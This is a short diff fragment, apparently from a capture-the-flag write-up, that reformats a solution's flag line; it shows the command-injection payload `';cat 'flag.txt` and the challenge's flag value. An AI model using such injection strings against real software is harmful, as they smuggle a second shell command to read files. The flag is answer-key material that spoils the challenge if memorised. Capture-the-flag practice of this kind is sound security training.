@@ -23,4 +23,4 @@ def get_note(nid):
 
 Final Exploit: `';cat 'flag.txt`
 
-Flag:flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}
+Flag: `flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}`
